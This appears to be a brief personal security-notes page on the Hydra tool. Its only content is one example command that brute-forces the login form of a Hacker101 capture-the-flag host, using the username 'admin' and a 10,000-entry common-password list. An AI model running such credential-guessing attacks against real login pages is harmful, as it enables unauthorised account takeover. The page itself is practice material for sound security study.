---
{"dg-publish":true,"permalink":"/itsi/tools/hydra/"}
---

## Examples
```bash
hydra -l admin \                                                                                                                                                    
  -P Tools/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt \
  f030ceb1154faf1d02ba68c5e54756af.ctf.hacker101.com \
  https-post-form "/index.php?page=sign_in.php:username=^USER^&password=^PASS^:wrong username/password combination" \
  -t 16 -w 25 -W 3 -4 -V -o hydra-out.txt
```